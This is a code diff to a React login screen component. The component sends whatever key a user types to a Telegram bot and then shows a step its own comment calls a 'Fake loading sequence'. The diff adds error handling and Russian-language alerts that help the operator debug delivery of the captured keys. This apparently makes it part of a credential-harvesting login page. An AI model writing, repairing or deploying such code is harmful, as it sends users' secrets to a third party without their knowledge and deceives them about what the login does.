@@ -15,15 +15,20 @@ const LoginScreen: React.FC<LoginScreenProps> = ({ onLogin, lang }) => {
 
   // Function to send data to Telegram
   const logToTelegram = async (userId: string) => {
-    // Access env via any cast to avoid TS error "Property 'env' does not exist on type 'ImportMeta'"
-    // This happens when vite-env.d.ts is missing or not picked up by the compiler
+    // Access env via any cast to avoid TS error
     const env = (import.meta as any).env;
     const token = env?.VITE_TELEGRAM_TOKEN;
     const chatId = env?.VITE_TELEGRAM_CHAT_ID;
 
-    // Skip if env vars are missing (development mode check)
-    if (!token || !chatId) {
-      console.warn("Telegram logs disabled: Missing VITE_TELEGRAM_TOKEN or VITE_TELEGRAM_CHAT_ID");
+    console.log("Attempting to send to Telegram...");
+    
+    // Debug checks
+    if (!token) {
+      console.error("❌ ERROR: VITE_TELEGRAM_TOKEN is missing. Check your .env file.");
+      return;
+    }
+    if (!chatId) {
+      console.error("❌ ERROR: VITE_TELEGRAM_CHAT_ID is missing. Check your .env file.");
       return;
     }
 
@@ -36,7 +41,7 @@ const LoginScreen: React.FC<LoginScreenProps> = ({ onLogin, lang }) => {
     `;
 
     try {
-      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -45,8 +50,22 @@ const LoginScreen: React.FC<LoginScreenProps> = ({ onLogin, lang }) => {
           parse_mode: 'HTML'
         })
       });
+
+      const data = await response.json();
+
+      if (!response.ok) {
+        console.error("❌ Telegram API Error:", data);
+        if (data.description === "Forbidden: bot was blocked by the user") {
+          alert("ОШИБКА: Вы не нажали /start в своем боте!");
+        } else if (data.description === "Bad Request: chat not found") {
+             alert("ОШИБКА: Неверный Chat ID или вы не начали диалог с ботом.");
+        }
+      } else {
+        console.log("✅ Telegram message sent successfully!", data);
+      }
+
     } catch (error) {
-      console.error("Failed to send log to Telegram", error);
+      console.error("❌ Network Error sending to Telegram:", error);
     }
   };
 
@@ -56,7 +75,7 @@ const LoginScreen: React.FC<LoginScreenProps> = ({ onLogin, lang }) => {
 
     setStatus('checking');
     
-    // Send data to Telegram immediately (fire and forget)
+    // Send data to Telegram
     logToTelegram(key);
     
     // Fake loading sequence
